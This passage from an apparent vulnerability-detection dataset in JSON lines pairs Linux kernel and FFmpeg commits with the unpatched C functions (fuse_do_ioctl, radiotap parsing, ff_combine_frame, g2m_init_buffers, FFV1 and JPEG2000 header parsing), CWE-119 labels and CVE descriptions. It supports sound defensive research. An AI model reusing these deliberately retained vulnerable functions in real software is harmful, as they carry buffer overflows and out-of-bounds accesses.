attacks, and gain privileges or obtain sensitive information, via a crafted LDM partition table.  NOTE: this vulnerability exists because of an incomplete fix for CVE-2011-1017.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2011-2182"}
{"idx": 885, "project": "linux", "commit_id": "7572777eef78ebdee1ecb7c258c0ef94d35bad16", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/7572777eef78ebdee1ecb7c258c0ef94d35bad16", "commit_message": "fuse: verify ioctl retries\n\nVerify that the total length of the iovec returned in FUSE_IOCTL_RETRY\ndoesn't overflow iov_length().\n\nSigned-off-by: Miklos Szeredi <mszeredi@suse.cz>\nCC: Tejun Heo <tj@kernel.org>\nCC: <stable@kernel.org>         [2.6.31+]", "target": 1, "func": "long fuse_do_ioctl(struct file *file, unsigned int cmd, unsigned long arg,\n\t\t   unsigned int flags)\n{\n\tstruct fuse_file *ff = file->private_data;\n\tstruct fuse_conn *fc = ff->fc;\n\tstruct fuse_ioctl_in inarg = {\n\t\t.fh = ff->fh,\n\t\t.cmd = cmd,\n\t\t.arg = arg,\n\t\t.flags = flags\n\t};\n\tstruct fuse_ioctl_out outarg;\n\tstruct fuse_req *req = NULL;\n\tstruct page **pages = NULL;\n\tstruct page *iov_page = NULL;\n\tstruct iovec *in_iov = NULL, *out_iov = NULL;\n\tunsigned int in_iovs = 0, out_iovs = 0, num_pages = 0, max_pages;\n\tsize_t in_size, out_size, transferred;\n\tint err;\n\n\t/* assume all the iovs returned by client always fits in a page */\n\tBUILD_BUG_ON(sizeof(struct iovec) * FUSE_IOCTL_MAX_IOV > PAGE_SIZE);\n\n\terr = -ENOMEM;\n\tpages = kzalloc(sizeof(pages[0]) * FUSE_MAX_PAGES_PER_REQ, GFP_KERNEL);\n\tiov_page = alloc_page(GFP_KERNEL);\n\tif (!pages || !iov_page)\n\t\tgoto out;\n\n\t/*\n\t * If restricted, initialize IO parameters as encoded in @cmd.\n\t * RETRY from server is not allowed.\n\t */\n\tif (!(flags & FUSE_IOCTL_UNRESTRICTED)) {\n\t\tstruct iovec *iov = page_address(iov_page);\n\n\t\tiov->iov_base = (void __user *)arg;\n\t\tiov->iov_len = _IOC_SIZE(cmd);\n\n\t\tif (_IOC_DIR(cmd) & _IOC_WRITE) {\n\t\t\tin_iov = iov;\n\t\t\tin_iovs = 1;\n\t\t}\n\n\t\tif (_IOC_DIR(cmd) & _IOC_READ) {\n\t\t\tout_iov = iov;\n\t\t\tout_iovs = 1;\n\t\t}\n\t}\n\n retry:\n\tinarg.in_size = in_size = iov_length(in_iov, in_iovs);\n\tinarg.out_size = out_size = iov_length(out_iov, out_iovs);\n\n\t/*\n\t * Out data can be used either for actual out data or iovs,\n\t * make sure there always is at least one page.\n\t */\n\tout_size = max_t(size_t, out_size, PAGE_SIZE);\n\tmax_pages = DIV_ROUND_UP(max(in_size, out_size), PAGE_SIZE);\n\n\t/* make sure there are enough buffer pages and init request with them */\n\terr = -ENOMEM;\n\tif (max_pages > FUSE_MAX_PAGES_PER_REQ)\n\t\tgoto out;\n\twhile (num_pages < max_pages) {\n\t\tpages[num_pages] = alloc_page(GFP_KERNEL | __GFP_HIGHMEM);\n\t\tif (!pages[num_pages])\n\t\t\tgoto out;\n\t\tnum_pages++;\n\t}\n\n\treq = fuse_get_req(fc);\n\tif (IS_ERR(req)) {\n\t\terr = PTR_ERR(req);\n\t\treq = NULL;\n\t\tgoto out;\n\t}\n\tmemcpy(req->pages, pages, sizeof(req->pages[0]) * num_pages);\n\treq->num_pages = num_pages;\n\n\t/* okay, let's send it to the client */\n\treq->in.h.opcode = FUSE_IOCTL;\n\treq->in.h.nodeid = ff->nodeid;\n\treq->in.numargs = 1;\n\treq->in.args[0].size = sizeof(inarg);\n\treq->in.args[0].value = &inarg;\n\tif (in_size) {\n\t\treq->in.numargs++;\n\t\treq->in.args[1].size = in_size;\n\t\treq->in.argpages = 1;\n\n\t\terr = fuse_ioctl_copy_user(pages, in_iov, in_iovs, in_size,\n\t\t\t\t\t   false);\n\t\tif (err)\n\t\t\tgoto out;\n\t}\n\n\treq->out.numargs = 2;\n\treq->out.args[0].size = sizeof(outarg);\n\treq->out.args[0].value = &outarg;\n\treq->out.args[1].size = out_size;\n\treq->out.argpages = 1;\n\treq->out.argvar = 1;\n\n\tfuse_request_send(fc, req);\n\terr = req->out.h.error;\n\ttransferred = req->out.args[1].size;\n\tfuse_put_request(fc, req);\n\treq = NULL;\n\tif (err)\n\t\tgoto out;\n\n\t/* did it ask for retry? */\n\tif (outarg.flags & FUSE_IOCTL_RETRY) {\n\t\tchar *vaddr;\n\n\t\t/* no retry if in restricted mode */\n\t\terr = -EIO;\n\t\tif (!(flags & FUSE_IOCTL_UNRESTRICTED))\n\t\t\tgoto out;\n\n\t\tin_iovs = outarg.in_iovs;\n\t\tout_iovs = outarg.out_iovs;\n\n\t\t/*\n\t\t * Make sure things are in boundary, separate checks\n\t\t * are to protect against overflow.\n\t\t */\n\t\terr = -ENOMEM;\n\t\tif (in_iovs > FUSE_IOCTL_MAX_IOV ||\n\t\t    out_iovs > FUSE_IOCTL_MAX_IOV ||\n\t\t    in_iovs + out_iovs > FUSE_IOCTL_MAX_IOV)\n\t\t\tgoto out;\n\n\t\tvaddr = kmap_atomic(pages[0], KM_USER0);\n\t\terr = fuse_copy_ioctl_iovec(page_address(iov_page), vaddr,\n\t\t\t\t\t    transferred, in_iovs + out_iovs,\n\t\t\t\t\t    (flags & FUSE_IOCTL_COMPAT) != 0);\n\t\tkunmap_atomic(vaddr, KM_USER0);\n\t\tif (err)\n\t\t\tgoto out;\n\n \t\tin_iov = page_address(iov_page);\n \t\tout_iov = in_iov + in_iovs;\n \n \t\tgoto retry;\n \t}\n \n\terr = -EIO;\n\tif (transferred > inarg.out_size)\n\t\tgoto out;\n\n\terr = fuse_ioctl_copy_user(pages, out_iov, out_iovs, transferred, true);\n out:\n\tif (req)\n\t\tfuse_put_request(fc, req);\n\tif (iov_page)\n\t\t__free_page(iov_page);\n\twhile (num_pages)\n\t\t__free_page(pages[--num_pages]);\n\tkfree(pages);\n\n\treturn err ? err : outarg.result;\n}\n", "func_hash": 265577904395187415417640424029624842814, "file_name": "file.c", "file_hash": 190320006487793698673771520320607608387, "cwe": ["CWE-119"], "cve": "CVE-2010-4650", "cve_desc": "Buffer overflow in the fuse_do_ioctl function in fs/fuse/file.c in the Linux kernel before 2.6.37 allows local users to cause a denial of service or possibly have unspecified other impact by leveraging the ability to operate a CUSE server.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-4650"}
{"idx": 888, "project": "linux", "commit_id": "f5563318ff1bde15b10e736e97ffce13be08bc1a", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/f5563318ff1bde15b10e736e97ffce13be08bc1a", "commit_message": "wireless: radiotap: fix parsing buffer overrun\n\nWhen parsing an invalid radiotap header, the parser can overrun\nthe buffer that is passed in because it doesn't correctly check\n 1) the minimum radiotap header size\n 2) the space for extended bitmaps\n\nThe first issue doesn't affect any in-kernel user as they all\ncheck the minimum size before calling the radiotap function.\nThe second issue could potentially affect the kernel if an skb\nis passed in that consists only of the radiotap header with a\nlot of extended bitmaps that extend past the SKB. In that case\na read-only buffer overrun by at most 4 bytes is possible.\n\nFix this by adding the appropriate checks to the parser.\n\nCc: stable@vger.kernel.org\nReported-by: Evan Huus <eapache@gmail.com>\nSigned-off-by: Johannes Berg <johannes.berg@intel.com>", "target": 1, "func": "int ieee80211_radiotap_iterator_init(\n\tstruct ieee80211_radiotap_iterator *iterator,\n \tstruct ieee80211_radiotap_header *radiotap_header,\n \tint max_length, const struct ieee80211_radiotap_vendor_namespaces *vns)\n {\n \t/* Linux only supports version 0 radiotap format */\n \tif (radiotap_header->it_version)\n \t\treturn -EINVAL;\n\n\t/* sanity check for allowed length and radiotap length field */\n\tif (max_length < get_unaligned_le16(&radiotap_header->it_len))\n\t\treturn -EINVAL;\n\n\titerator->_rtheader = radiotap_header;\n\titerator->_max_length = get_unaligned_le16(&radiotap_header->it_len);\n\titerator->_arg_index = 0;\n\titerator->_bitmap_shifter = get_unaligned_le32(&radiotap_header->it_present);\n\titerator->_arg = (uint8_t *)radiotap_header + sizeof(*radiotap_header);\n\titerator->_reset_on_ext = 0;\n\titerator->_next_bitmap = &radiotap_header->it_present;\n\titerator->_next_bitmap++;\n\titerator->_vns = vns;\n\titerator->current_namespace = &radiotap_ns;\n\titerator->is_radiotap_ns = 1;\n\n\t/* find payload start allowing for extended bitmap(s) */\n\n\tif (iterator->_bitmap_shifter & (1<<IEEE80211_RADIOTAP_EXT)) {\n\t\twhile (get_unaligned_le32(iterator->_arg) &\n\t\t\t\t\t(1 << IEEE80211_RADIOTAP_EXT)) {\n\t\t\titerator->_arg += sizeof(uint32_t);\n\n\t\t\t/*\n\t\t\t * check for insanity where the present bitmaps\n\t\t\t * keep claiming to extend up to or even beyond the\n\t\t\t * stated radiotap header length\n \t\t\t */\n \n \t\t\tif ((unsigned long)iterator->_arg -\n\t\t\t    (unsigned long)iterator->_rtheader >\n \t\t\t    (unsigned long)iterator->_max_length)\n \t\t\t\treturn -EINVAL;\n \t\t}\n\n\t\titerator->_arg += sizeof(uint32_t);\n\n\t\t/*\n\t\t * no need to check again for blowing past stated radiotap\n\t\t * header length, because ieee80211_radiotap_iterator_next\n\t\t * checks it before it is dereferenced\n\t\t */\n\t}\n\n\titerator->this_arg = iterator->_arg;\n\n\t/* we are all initialized happily */\n\n\treturn 0;\n}\n", "func_hash": 202083656134031078857371790539548342481, "file_name": "radiotap.c", "file_hash": 86018721253196034830238904808493686912, "cwe": ["CWE-119"], "cve": "CVE-2013-7027", "cve_desc": "The ieee80211_radiotap_iterator_init function in net/wireless/radiotap.c in the Linux kernel before 3.11.7 does not check whether a frame contains any data outside of the header, which might allow attackers to cause a denial of service (buffer over-read) via a crafted header.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7027"}
{"idx": 893, "project": "FFmpeg", "commit_id": "f31011e9abfb2ae75bb32bc44e2c34194c8dc40a", "project_url": "https://github.com/FFmpeg/FFmpeg", "commit_url": "https://github.com/FFmpeg/FFmpeg/commit/f31011e9abfb2ae75bb32bc44e2c34194c8dc40a", "commit_message": "avcodec/parser: reset indexes on realloc failure\n\nFixes Ticket2982\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>", "target": 1, "func": "int ff_combine_frame(ParseContext *pc, int next, const uint8_t **buf, int *buf_size)\n{\n    if(pc->overread){\n        av_dlog(NULL, \"overread %d, state:%X next:%d index:%d o_index:%d\\n\",\n                pc->overread, pc->state, next, pc->index, pc->overread_index);\n        av_dlog(NULL, \"%X %X %X %X\\n\", (*buf)[0], (*buf)[1], (*buf)[2], (*buf)[3]);\n    }\n\n    /* Copy overread bytes from last frame into buffer. */\n    for(; pc->overread>0; pc->overread--){\n        pc->buffer[pc->index++]= pc->buffer[pc->overread_index++];\n    }\n\n    /* flush remaining if EOF */\n    if(!*buf_size && next == END_NOT_FOUND){\n        next= 0;\n    }\n\n    pc->last_index= pc->index;\n\n    /* copy into buffer end return */\n     if(next == END_NOT_FOUND){\n         void* new_buffer = av_fast_realloc(pc->buffer, &pc->buffer_size, (*buf_size) + pc->index + FF_INPUT_BUFFER_PADDING_SIZE);\n \n        if(!new_buffer)\n             return AVERROR(ENOMEM);\n         pc->buffer = new_buffer;\n         memcpy(&pc->buffer[pc->index], *buf, *buf_size);\n         pc->index += *buf_size;\n        return -1;\n    }\n\n    *buf_size=\n    pc->overread_index= pc->index + next;\n\n     /* append to buffer */\n     if(pc->index){\n         void* new_buffer = av_fast_realloc(pc->buffer, &pc->buffer_size, next + pc->index + FF_INPUT_BUFFER_PADDING_SIZE);\n        if(!new_buffer)\n             return AVERROR(ENOMEM);\n         pc->buffer = new_buffer;\n         if (next > -FF_INPUT_BUFFER_PADDING_SIZE)\n             memcpy(&pc->buffer[pc->index], *buf,\n                   next + FF_INPUT_BUFFER_PADDING_SIZE);\n        pc->index = 0;\n        *buf= pc->buffer;\n    }\n\n    /* store overread bytes */\n    for(;next < 0; next++){\n        pc->state = (pc->state<<8) | pc->buffer[pc->last_index + next];\n        pc->state64 = (pc->state64<<8) | pc->buffer[pc->last_index + next];\n        pc->overread++;\n    }\n\n    if(pc->overread){\n        av_dlog(NULL, \"overread %d, state:%X next:%d index:%d o_index:%d\\n\",\n                pc->overread, pc->state, next, pc->index, pc->overread_index);\n        av_dlog(NULL, \"%X %X %X %X\\n\", (*buf)[0], (*buf)[1],(*buf)[2],(*buf)[3]);\n    }\n\n    return 0;\n}\n", "func_hash": 222309056610865204382267494971212653031, "file_name": "parser.c", "file_hash": 161485228604924499795333847261985724199, "cwe": ["CWE-119"], "cve": "CVE-2013-7023", "cve_desc": "The ff_combine_frame function in libavcodec/parser.c in FFmpeg before 2.1 does not properly handle certain memory-allocation errors, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7023"}
{"idx": 894, "project": "FFmpeg", "commit_id": "e07ac727c1cc9eed39e7f9117c97006f719864bd", "project_url": "https://github.com/FFmpeg/FFmpeg", "commit_url": "https://github.com/FFmpeg/FFmpeg/commit/e07ac727c1cc9eed39e7f9117c97006f719864bd", "commit_message": "avcodec/g2meet: Fix framebuf size\n\nCurrently the code can in some cases draw tiles that hang outside the\nallocated buffer. This patch increases the buffer size to avoid out\nof array accesses. An alternative would be to fail if such tiles are\nencountered.\nI do not know if any valid files use such hanging tiles.\n\nFixes Ticket2971\nFound-by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>", "target": 1, "func": "static int g2m_init_buffers(G2MContext *c)\n{\n     int aligned_height;\n \n     if (!c->framebuf || c->old_width < c->width || c->old_height < c->height) {\n        c->framebuf_stride = FFALIGN(c->width * 3, 16);\n        aligned_height     = FFALIGN(c->height,    16);\n         av_free(c->framebuf);\n         c->framebuf = av_mallocz(c->framebuf_stride * aligned_height);\n         if (!c->framebuf)\n            return AVERROR(ENOMEM);\n    }\n    if (!c->synth_tile || !c->jpeg_tile ||\n        c->old_tile_w < c->tile_width ||\n        c->old_tile_h < c->tile_height) {\n        c->tile_stride = FFALIGN(c->tile_width, 16) * 3;\n        aligned_height = FFALIGN(c->tile_height,    16);\n        av_free(c->synth_tile);\n        av_free(c->jpeg_tile);\n        av_free(c->kempf_buf);\n        av_free(c->kempf_flags);\n        c->synth_tile  = av_mallocz(c->tile_stride      * aligned_height);\n        c->jpeg_tile   = av_mallocz(c->tile_stride      * aligned_height);\n        c->kempf_buf   = av_mallocz((c->tile_width + 1) * aligned_height\n                                    + FF_INPUT_BUFFER_PADDING_SIZE);\n        c->kempf_flags = av_mallocz( c->tile_width      * aligned_height);\n        if (!c->synth_tile || !c->jpeg_tile ||\n            !c->kempf_buf || !c->kempf_flags)\n            return AVERROR(ENOMEM);\n    }\n\n    return 0;\n}\n", "func_hash": 255877059988693141105119960061023166155, "file_name": "g2meet.c", "file_hash": 290068666600478234047325352245656051849, "cwe": ["CWE-119"], "cve": "CVE-2013-7022", "cve_desc": "The g2m_init_buffers function in libavcodec/g2meet.c in FFmpeg before 2.1 does not properly allocate memory for tiles, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted Go2Webinar data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7022"}
{"idx": 896, "project": "FFmpeg", "commit_id": "b05cd1ea7e45a836f7f6071a716c38bb30326e0f", "project_url": "https://github.com/FFmpeg/FFmpeg", "commit_url": "https://github.com/FFmpeg/FFmpeg/commit/b05cd1ea7e45a836f7f6071a716c38bb30326e0f", "commit_message": "ffv1dec: Check bits_per_raw_sample and colorspace for equality in ver 0/1 headers\n\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>", "target": 1, "func": "static int read_header(FFV1Context *f)\n{\n    uint8_t state[CONTEXT_SIZE];\n    int i, j, context_count = -1; //-1 to avoid warning\n    RangeCoder *const c = &f->slice_context[0]->c;\n\n     memset(state, 128, sizeof(state));\n \n     if (f->version < 2) {\n        int chroma_planes, chroma_h_shift, chroma_v_shift, transparency;\n         unsigned v= get_symbol(c, state, 0);\n         if (v >= 2) {\n             av_log(f->avctx, AV_LOG_ERROR, \"invalid version %d in ver01 header\\n\", v);\n            return AVERROR_INVALIDDATA;\n        }\n        f->version = v;\n        f->ac      = f->avctx->coder_type = get_symbol(c, state, 0);\n        if (f->ac > 1) {\n            for (i = 1; i < 256; i++)\n                 f->state_transition[i] = get_symbol(c, state, 1) + c->one_state[i];\n         }\n \n        f->colorspace = get_symbol(c, state, 0); //YUV cs type\n        if (f->version > 0)\n            f->avctx->bits_per_raw_sample = get_symbol(c, state, 0);\n         chroma_planes  = get_rac(c, state);\n         chroma_h_shift = get_symbol(c, state, 0);\n         chroma_v_shift = get_symbol(c, state, 0);\n         transparency   = get_rac(c, state);\n \n         if (f->plane_count) {\n            if (   chroma_planes != f->chroma_planes\n                 || chroma_h_shift!= f->chroma_h_shift\n                 || chroma_v_shift!= f->chroma_v_shift\n                 || transparency  != f->transparency) {\n                av_log(f->avctx, AV_LOG_ERROR, \"Invalid change of global parameters\\n\");\n                return AVERROR_INVALIDDATA;\n             }\n         }\n \n         f->chroma_planes  = chroma_planes;\n         f->chroma_h_shift = chroma_h_shift;\n         f->chroma_v_shift = chroma_v_shift;\n        f->transparency   = transparency;\n\n        f->plane_count    = 2 + f->transparency;\n    }\n\n    if (f->colorspace == 0) {\n        if (!f->transparency && !f->chroma_planes) {\n            if (f->avctx->bits_per_raw_sample <= 8)\n                f->avctx->pix_fmt = AV_PIX_FMT_GRAY8;\n            else\n                f->avctx->pix_fmt = AV_PIX_FMT_GRAY16;\n        } else if (f->avctx->bits_per_raw_sample<=8 && !f->transparency) {\n            switch(16 * f->chroma_h_shift + f->chroma_v_shift) {\n            case 0x00: f->avctx->pix_fmt = AV_PIX_FMT_YUV444P; break;\n            case 0x01: f->avctx->pix_fmt = AV_PIX_FMT_YUV440P; break;\n            case 0x10: f->avctx->pix_fmt = AV_PIX_FMT_YUV422P; break;\n            case 0x11: f->avctx->pix_fmt = AV_PIX_FMT_YUV420P; break;\n            case 0x20: f->avctx->pix_fmt = AV_PIX_FMT_YUV411P; break;\n            case 0x22: f->avctx->pix_fmt = AV_PIX_FMT_YUV410P; break;\n            default:\n                av_log(f->avctx, AV_LOG_ERROR, \"format not supported\\n\");\n                return AVERROR(ENOSYS);\n            }\n        } else if (f->avctx->bits_per_raw_sample <= 8 && f->transparency) {\n            switch(16*f->chroma_h_shift + f->chroma_v_shift) {\n            case 0x00: f->avctx->pix_fmt = AV_PIX_FMT_YUVA444P; break;\n            case 0x10: f->avctx->pix_fmt = AV_PIX_FMT_YUVA422P; break;\n            case 0x11: f->avctx->pix_fmt = AV_PIX_FMT_YUVA420P; break;\n            default:\n                av_log(f->avctx, AV_LOG_ERROR, \"format not supported\\n\");\n                return AVERROR(ENOSYS);\n            }\n        } else if (f->avctx->bits_per_raw_sample == 9) {\n            f->packed_at_lsb = 1;\n            switch(16 * f->chroma_h_shift + f->chroma_v_shift) {\n            case 0x00: f->avctx->pix_fmt = AV_PIX_FMT_YUV444P9; break;\n            case 0x10: f->avctx->pix_fmt = AV_PIX_FMT_YUV422P9; break;\n            case 0x11: f->avctx->pix_fmt = AV_PIX_FMT_YUV420P9; break;\n            default:\n                av_log(f->avctx, AV_LOG_ERROR, \"format not supported\\n\");\n                return AVERROR(ENOSYS);\n            }\n        } else if (f->avctx->bits_per_raw_sample == 10) {\n            f->packed_at_lsb = 1;\n            switch(16 * f->chroma_h_shift + f->chroma_v_shift) {\n            case 0x00: f->avctx->pix_fmt = AV_PIX_FMT_YUV444P10; break;\n            case 0x10: f->avctx->pix_fmt = AV_PIX_FMT_YUV422P10; break;\n            case 0x11: f->avctx->pix_fmt = AV_PIX_FMT_YUV420P10; break;\n            default:\n                av_log(f->avctx, AV_LOG_ERROR, \"format not supported\\n\");\n                return AVERROR(ENOSYS);\n            }\n        } else {\n            switch(16 * f->chroma_h_shift + f->chroma_v_shift) {\n            case 0x00: f->avctx->pix_fmt = AV_PIX_FMT_YUV444P16; break;\n            case 0x10: f->avctx->pix_fmt = AV_PIX_FMT_YUV422P16; break;\n            case 0x11: f->avctx->pix_fmt = AV_PIX_FMT_YUV420P16; break;\n            default:\n                av_log(f->avctx, AV_LOG_ERROR, \"format not supported\\n\");\n                return AVERROR(ENOSYS);\n            }\n        }\n    } else if (f->colorspace == 1) {\n        if (f->chroma_h_shift || f->chroma_v_shift) {\n            av_log(f->avctx, AV_LOG_ERROR,\n                   \"chroma subsampling not supported in this colorspace\\n\");\n            return AVERROR(ENOSYS);\n        }\n        if (     f->avctx->bits_per_raw_sample ==  9)\n            f->avctx->pix_fmt = AV_PIX_FMT_GBRP9;\n        else if (f->avctx->bits_per_raw_sample == 10)\n            f->avctx->pix_fmt = AV_PIX_FMT_GBRP10;\n        else if (f->avctx->bits_per_raw_sample == 12)\n            f->avctx->pix_fmt = AV_PIX_FMT_GBRP12;\n        else if (f->avctx->bits_per_raw_sample == 14)\n            f->avctx->pix_fmt = AV_PIX_FMT_GBRP14;\n        else\n        if (f->transparency) f->avctx->pix_fmt = AV_PIX_FMT_RGB32;\n        else                 f->avctx->pix_fmt = AV_PIX_FMT_0RGB32;\n    } else {\n        av_log(f->avctx, AV_LOG_ERROR, \"colorspace not supported\\n\");\n        return AVERROR(ENOSYS);\n    }\n\n    av_dlog(f->avctx, \"%d %d %d\\n\",\n            f->chroma_h_shift, f->chroma_v_shift, f->avctx->pix_fmt);\n    if (f->version < 2) {\n        context_count = read_quant_tables(c, f->quant_table);\n        if (context_count < 0) {\n            av_log(f->avctx, AV_LOG_ERROR, \"read_quant_table error\\n\");\n            return AVERROR_INVALIDDATA;\n        }\n    } else if (f->version < 3) {\n        f->slice_count = get_symbol(c, state, 0);\n    } else {\n        const uint8_t *p = c->bytestream_end;\n        for (f->slice_count = 0;\n             f->slice_count < MAX_SLICES && 3 < p - c->bytestream_start;\n             f->slice_count++) {\n            int trailer = 3 + 5*!!f->ec;\n            int size = AV_RB24(p-trailer);\n            if (size + trailer > p - c->bytestream_start)\n                break;\n            p -= size + trailer;\n        }\n    }\n    if (f->slice_count > (unsigned)MAX_SLICES || f->slice_count <= 0) {\n        av_log(f->avctx, AV_LOG_ERROR, \"slice count %d is invalid\\n\", f->slice_count);\n        return AVERROR_INVALIDDATA;\n    }\n\n    for (j = 0; j < f->slice_count; j++) {\n        FFV1Context *fs = f->slice_context[j];\n        fs->ac            = f->ac;\n        fs->packed_at_lsb = f->packed_at_lsb;\n\n        fs->slice_damaged = 0;\n\n        if (f->version == 2) {\n            fs->slice_x      =  get_symbol(c, state, 0)      * f->width ;\n            fs->slice_y      =  get_symbol(c, state, 0)      * f->height;\n            fs->slice_width  = (get_symbol(c, state, 0) + 1) * f->width  + fs->slice_x;\n            fs->slice_height = (get_symbol(c, state, 0) + 1) * f->height + fs->slice_y;\n\n            fs->slice_x     /= f->num_h_slices;\n            fs->slice_y     /= f->num_v_slices;\n            fs->slice_width  = fs->slice_width  / f->num_h_slices - fs->slice_x;\n            fs->slice_height = fs->slice_height / f->num_v_slices - fs->slice_y;\n            if ((unsigned)fs->slice_width  > f->width ||\n                (unsigned)fs->slice_height > f->height)\n                return AVERROR_INVALIDDATA;\n            if (   (unsigned)fs->slice_x + (uint64_t)fs->slice_width  > f->width\n                || (unsigned)fs->slice_y + (uint64_t)fs->slice_height > f->height)\n                return AVERROR_INVALIDDATA;\n        }\n\n        for (i = 0; i < f->plane_count; i++) {\n            PlaneContext *const p = &fs->plane[i];\n\n            if (f->version == 2) {\n                int idx = get_symbol(c, state, 0);\n                if (idx > (unsigned)f->quant_table_count) {\n                    av_log(f->avctx, AV_LOG_ERROR,\n                           \"quant_table_index out of range\\n\");\n                    return AVERROR_INVALIDDATA;\n                }\n                p->quant_table_index = idx;\n                memcpy(p->quant_table, f->quant_tables[idx],\n                       sizeof(p->quant_table));\n                context_count = f->context_count[idx];\n            } else {\n                memcpy(p->quant_table, f->quant_table, sizeof(p->quant_table));\n            }\n\n            if (f->version <= 2) {\n                av_assert0(context_count >= 0);\n                if (p->context_count < context_count) {\n                    av_freep(&p->state);\n                    av_freep(&p->vlc_state);\n                }\n                p->context_count = context_count;\n            }\n        }\n    }\n    return 0;\n}\n", "func_hash": 145906591874544820355065071924399305170, "file_name": "ffv1dec.c", "file_hash": 84436554014232129853499938047934081021, "cwe": ["CWE-119"], "cve": "CVE-2013-7020", "cve_desc": "The read_header function in libavcodec/ffv1dec.c in FFmpeg before 2.1 does not properly enforce certain bit-count and colorspace constraints, which allows remote attackers to cause a denial of service (out-of-bounds array access) or possibly have unspecified other impact via crafted FFV1 data.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2013-7020"}
{"idx": 905, "project": "FFmpeg", "commit_id": "780669ef7c23c00836a24921fcc6b03be2b8ca4a", "project_url": "https://github.com/FFmpeg/FFmpeg", "commit_url": "https://github.com/FFmpeg/FFmpeg/commit/780669ef7c23c00836a24921fcc6b03be2b8ca4a", "commit_message": "avcodec/jpeg2000dec: non zero image offsets are not supported\n\nFixes out of array accesses\nFixes Ticket3080\nFound-by: ami_stuff\nSigned-off-by: Michael Niedermayer <michaelni@gmx.at>", "target": 1, "func": "static int get_siz(Jpeg2000DecoderContext *s)\n{\n    int i;\n    int ncomponents;\n    uint32_t log2_chroma_wh = 0;\n    const enum AVPixelFormat *possible_fmts = NULL;\n    int possible_fmts_nb = 0;\n\n    if (bytestream2_get_bytes_left(&s->g) < 36)\n        return AVERROR_INVALIDDATA;\n\n    s->avctx->profile = bytestream2_get_be16u(&s->g); // Rsiz\n    s->width          = bytestream2_get_be32u(&s->g); // Width\n    s->height         = bytestream2_get_be32u(&s->g); // Height\n    s->image_offset_x = bytestream2_get_be32u(&s->g); // X0Siz\n    s->image_offset_y = bytestream2_get_be32u(&s->g); // Y0Siz\n    s->tile_width     = bytestream2_get_be32u(&s->g); // XTSiz\n    s->tile_height    = bytestream2_get_be32u(&s->g); // YTSiz\n    s->tile_offset_x  = bytestream2_get_be32u(&s->g); // XT0Siz\n     s->tile_offset_y  = bytestream2_get_be32u(&s->g); // YT0Siz\n     ncomponents       = bytestream2_get_be16u(&s->g); // CSiz\n \n     if (ncomponents <= 0) {\n         av_log(s->avctx, AV_LOG_ERROR, \"Invalid number of components: %d\\n\",\n                s->ncomponents);\n        return AVERROR_INVALIDDATA;\n    }\n\n    if (ncomponents > 4) {\n        avpriv_request_sample(s->avctx, \"Support for %d components\",\n                              s->ncomponents);\n        return AVERROR_PATCHWELCOME;\n    }\n\n    s->ncomponents = ncomponents;\n\n    if (s->tile_width <= 0 || s->tile_height <= 0) {\n        av_log(s->avctx, AV_LOG_ERROR, \"Invalid tile dimension %dx%d.\\n\",\n               s->tile_width, s->tile_height);\n        return AVERROR_INVALIDDATA;\n    }\n\n    if (bytestream2_get_bytes_left(&s->g) < 3 * s->ncomponents)\n        return AVERROR_INVALIDDATA;\n\n    for (i = 0; i < s->ncomponents; i++) { // Ssiz_i XRsiz_i, YRsiz_i\n        uint8_t x    = bytestream2_get_byteu(&s->g);\n        s->cbps[i]   = (x & 0x7f) + 1;\n        s->precision = FFMAX(s->cbps[i], s->precision);\n        s->sgnd[i]   = !!(x & 0x80);\n        s->cdx[i]    = bytestream2_get_byteu(&s->g);\n        s->cdy[i]    = bytestream2_get_byteu(&s->g);\n        if (   !s->cdx[i] || s->cdx[i] == 3 || s->cdx[i] > 4\n            || !s->cdy[i] || s->cdy[i] == 3 || s->cdy[i] > 4) {\n            av_log(s->avctx, AV_LOG_ERROR, \"Invalid sample separation %d/%d\\n\", s->cdx[i], s->cdy[i]);\n            return AVERROR_INVALIDDATA;\n        }\n        log2_chroma_wh |= s->cdy[i] >> 1 << i * 4 | s->cdx[i] >> 1 << i * 4 + 2;\n    }\n\n    s->numXtiles = ff_jpeg2000_ceildiv(s->width  - s->tile_offset_x, s->tile_width);\n    s->numYtiles = ff_jpeg2000_ceildiv(s->height - s->tile_offset_y, s->tile_height);\n\n    if (s->numXtiles * (uint64_t)s->numYtiles > INT_MAX/sizeof(*s->tile)) {\n        s->numXtiles = s->numYtiles = 0;\n        return AVERROR(EINVAL);\n    }\n\n    s->tile = av_mallocz_array(s->numXtiles * s->numYtiles, sizeof(*s->tile));\n    if (!s->tile) {\n        s->numXtiles = s->numYtiles = 0;\n        return AVERROR(ENOMEM);\n    }\n\n    for (i = 0; i < s->numXtiles * s->numYtiles; i++) {\n        Jpeg2000Tile *tile = s->tile + i;\n\n        tile->comp = av_mallocz(s->ncomponents * sizeof(*tile->comp));\n        if (!tile->comp)\n            return AVERROR(ENOMEM);\n    }\n\n    /* compute image size with reduction factor */\n    s->avctx->width  = ff_jpeg2000_ceildivpow2(s->width  - s->image_offset_x,\n                                               s->reduction_factor);\n    s->avctx->height = ff_jpeg2000_ceildivpow2(s->height - s->image_offset_y,\n                                               s->reduction_factor);\n\n    if (s->avctx->profile == FF_PROFILE_JPEG2000_DCINEMA_2K ||\n        s->avctx->profile == FF_PROFILE_JPEG2000_DCINEMA_4K) {\n        possible_fmts = xyz_pix_fmts;\n        possible_fmts_nb = FF_ARRAY_ELEMS(xyz_pix_fmts);\n    } else {\n        switch (s->colour_space) {\n        case 16:\n            possible_fmts = rgb_pix_fmts;\n            possible_fmts_nb = FF_ARRAY_ELEMS(rgb_pix_fmts);\n            break;\n        case 17:\n            possible_fmts = gray_pix_fmts;\n            possible_fmts_nb = 